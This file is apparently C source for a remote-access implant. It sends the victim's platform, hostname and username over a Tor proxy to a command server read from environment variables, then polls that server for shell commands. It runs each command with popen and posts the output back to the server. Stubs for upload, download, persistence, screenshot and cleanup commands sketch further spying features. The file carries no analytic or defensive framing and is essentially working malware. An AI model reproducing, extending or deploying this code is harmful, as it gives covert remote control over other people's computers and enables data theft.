#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <curl/curl.h>
#include <unistd.h>
#include <pthread.h>

#define BUFFER_SIZE 256

#define SAVE_FILE "./save"

struct url_data {
    size_t size;
    char* data;
};
struct write_this {
  const char *readptr;
  size_t sizeleft;
};
char *UID;
char *PLATFORM;
char *HOSTNAME;
char *USERNAME;
const char *URL;
const char *URL_TOR;
int FAILED_COUNT;
bool IDLE;
int IDLE_TIME;
int INTERVAL;
long TIME_LAST_ACTIVE;

/* ----------------------------------------------------------------------- *
*  Utility
* ------------------------------------------------------------------------ */
char* get_command(char* todo)
{
    char *todo_temp = malloc(BUFFER_SIZE);
    strcpy(todo_temp,todo);
    char *token = strtok(todo_temp, " ");
    while (token != NULL)
    {
				return token;
    }
    return todo_temp;
}

char* get_args(char* todo)
{
    char *todo_temp = malloc(strlen(todo)+1);
    strcpy(todo_temp,todo);
    const char ch = ' ';
    char *ret;
    ret = strchr(todo_temp, ch);
    ret++;
    return ret;
}

int get_args_len(char* todo)
{
    char *todo_temp = malloc(BUFFER_SIZE);
    strcpy(todo_temp,todo);
    char *token = strtok(todo_temp, " ");
		int count = 0;
    while (token != NULL)
    {
				count++;
        token = strtok(NULL, " ");
    }
		return count - 1;
}

void succeeded_request()
{
    FAILED_COUNT = 0;
}

void failed_request(const char *error)
{
    FAILED_COUNT++;
    fprintf(stdout,"%s\nConsecutive failed connections: %d\n\n",error,FAILED_COUNT);
}

char* get_unique_id()
{
    if(!(UID!= NULL && UID[0] == '\0')) return UID;
    FILE *f;
    f = fopen(SAVE_FILE,"a+");
    if(f != NULL) fseek(f, 0, SEEK_END);
    if(ftell(f) == 0)
    {
        fclose(f);
        srand(time(0));
        int random = rand();
        f = fopen(SAVE_FILE,"w");
        sprintf(UID,"%s_%d",USERNAME,random);
        fprintf(f,"%s",UID);
        fclose(f);
        return UID;
    }
    else
    {
        fclose(f);
        f = fopen(SAVE_FILE,"r");
        fscanf(f,"%s",UID);
        fclose(f);
        return UID;
    }
}

long get_time()
{
    time_t current_time;
    time(&current_time);
    return current_time;
}


/* ----------------------------------------------------------------------- *
*  Request Wrapper
* ------------------------------------------------------------------------ */
size_t write_data(void *ptr, size_t size, size_t nmemb, struct url_data *data) {
    size_t index = data->size;
    size_t n = (size * nmemb);
    char* tmp;
    data->size += (size * nmemb);
    tmp = realloc(data->data, data->size + 1);
    if(tmp){
        data->data = tmp;
    }
    else
    {
        if(data->data)
        {
            free(data->data);
        }
        fprintf(stderr, "Failed to allocate memory.\n");
        return 0;
    }
    memcpy((data->data + index), ptr, n);
    data->data[data->size] = '\0';
    return size * nmemb;
}

char* get_request(char *path)
{
    CURL *curl;
    CURLcode res;
    struct url_data data;
    data.size = 0;
    data.data = malloc(BUFFER_SIZE);
    if(data.data == NULL) {
        fprintf(stderr, "Failed to allocate memory.\n");
        return NULL;
    }
    curl = curl_easy_init();
    if(curl) {
        char url[BUFFER_SIZE];
        strcpy(url, URL);
        strcat(url, path);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) failed_request(curl_easy_strerror(res));
        else succeeded_request();
        curl_easy_cleanup(curl);
    }
    return data.data;
}

char* post_request(char *path, char *post_data, bool json)
{
    CURL *curl;
    CURLcode res;
    struct url_data data;
    data.size = 0;
    data.data = malloc(BUFFER_SIZE);
    if(data.data == NULL) {
        fprintf(stderr, "Failed to allocate memory.\n");
        return NULL;
    }
    curl = curl_easy_init();
    if(curl) {
        char url[BUFFER_SIZE];
        strcpy(url, URL);
        strcat(url, path);
        struct curl_slist *headers = NULL;
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_PROXY, URL_TOR);
        if(json)
        {
            headers = curl_slist_append(headers, "Accept: application/json");
            headers = curl_slist_append(headers, "Content-Type: application/json");
            headers = curl_slist_append(headers, "charset: utf-8");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        }
        else
        {
            char *escaped_post_data = curl_easy_escape(curl, post_data, strlen(post_data));
            char *final_post_data = malloc(strlen(escaped_post_data) + BUFFER_SIZE);
            sprintf(final_post_data,"output=%s",escaped_post_data);
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, final_post_data);
            curl_free(escaped_post_data);
        }
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) failed_request(curl_easy_strerror(res));
        else succeeded_request();
        curl_easy_cleanup(curl);
    }
    return data.data;
}

/* ----------------------------------------------------------------------- *
*  Action Threads
* ------------------------------------------------------------------------ */
void send_output(char* output, bool newlines)
{
    char *output_temp = malloc(strlen(output)+BUFFER_SIZE);
    if(output!= NULL && output[0] == '\0') return;
    if(newlines)
    {
        strcpy(output_temp,output);
        strcat(output_temp,"\n\n");
    }
    else strcpy(output_temp,output);
    char *path = malloc(BUFFER_SIZE);
    sprintf(path, "/api/%s/report", get_unique_id());
    post_request(path, output_temp, false);

}
char* say_hello()
{
    char *path = malloc(BUFFER_SIZE);
    char *post_data = malloc(BUFFER_SIZE);
    sprintf(path, "/api/%s/hello", get_unique_id());
    sprintf(post_data,
            "{\"platform\": \"%s\",\
             \"hostname\": \"%s\",\
             \"username\": \"%s\"}",
            PLATFORM,HOSTNAME,USERNAME);
    return post_request(path, post_data, true);
}

void* do_command(void* input)
{
    char* command = (char*)input;
    command = realloc(command, strlen(command)+BUFFER_SIZE);
    printf("%s",command);
    sprintf(command, "%s 2>&1", command);
    char buffer[BUFFER_SIZE*2];
    size_t buffer_size = BUFFER_SIZE*2;
    char *output = malloc(BUFFER_SIZE*2);
    FILE *f = popen(command, "r");
    if(f == NULL)
    {
        pthread_exit(NULL);
    }
    while(fgets(buffer, sizeof(buffer), f) != NULL) {
        if(strlen(output) >= buffer_size-300)
        {
            buffer_size = buffer_size + BUFFER_SIZE*2;
            output = realloc(output, buffer_size);
        }
        strcat(output, buffer);
    }
    output = realloc(output, strlen(output) + BUFFER_SIZE);
    strcat(output,"\n\n");
    printf("%lu", strlen(output));
    printf("\n");
    send_output(output, true);
    pclose(f);
    pthread_exit(NULL);
}

/* ----------------------------------------------------------------------- *
*  Main Function
* ------------------------------------------------------------------------ */
void setup()
{
    UID = malloc(BUFFER_SIZE);
    PLATFORM = malloc(BUFFER_SIZE);
    HOSTNAME = malloc(BUFFER_SIZE);
    USERNAME = malloc(BUFFER_SIZE);
    FAILED_COUNT = 0;
    IDLE = true;
    IDLE_TIME = 60;
    INTERVAL = 3;
    TIME_LAST_ACTIVE = get_time();
    URL = getenv("URL");
    URL_TOR = getenv("URL_TOR");
    #if __APPLE__
        PLATFORM = "MAC OS";
    #elif _WIN32
        PLATFORM = "WINDOWS";
    #elif __LINUX__
        PLATFORM = "LINUX";
    #else
        PLATFORM = "NONE";
    #endif
    gethostname(HOSTNAME, BUFFER_SIZE);
    getlogin_r(USERNAME, BUFFER_SIZE);
}

void run()
{
    char *todo = malloc(BUFFER_SIZE*2);
    char *output = malloc(BUFFER_SIZE);
    while(1){
        todo = say_hello();
        if(!(todo!= NULL && todo[0] == '\0'))
        {
            IDLE = false;
            TIME_LAST_ACTIVE = get_time();
            sprintf(output,"$ %s",todo);
            send_output(output, true);
            char *command = get_command(todo);
            int args_len = get_args_len(todo);
            pthread_t tid;
            if(strcmp("cd",command) == 0)
            {
                if(args_len == 0)
                    send_output("Usage: cd </path/to/directory>",true);
                else
                    printf("%s",get_args(todo));
                    printf("\n");
                    chdir(get_args(todo));
            }
/*
            else if(strcmp("upload",command) == 0)
            {

            }
            else if(strcmp("download",command) == 0)
            {

            }
            else if(strcmp("clean",command) == 0)
            {

            }
            else if(strcmp("persist",command) == 0)
            {

            }
            else if(strcmp("exit",command) == 0)
            {

            }
            else if(strcmp("zip",command) == 0)
            {

            }
            else if(strcmp("screenshot",command) == 0)
            {

            }
*/
            else
            {
                pthread_create(&tid, NULL, do_command, todo);
            }
        }
        else
        {
            if(IDLE) sleep(INTERVAL);
            else if (get_time() - TIME_LAST_ACTIVE > IDLE_TIME) IDLE = true;
            else sleep(1);
        }
    }
}

int main()
{
    setup();
    run();
    return 0;
}
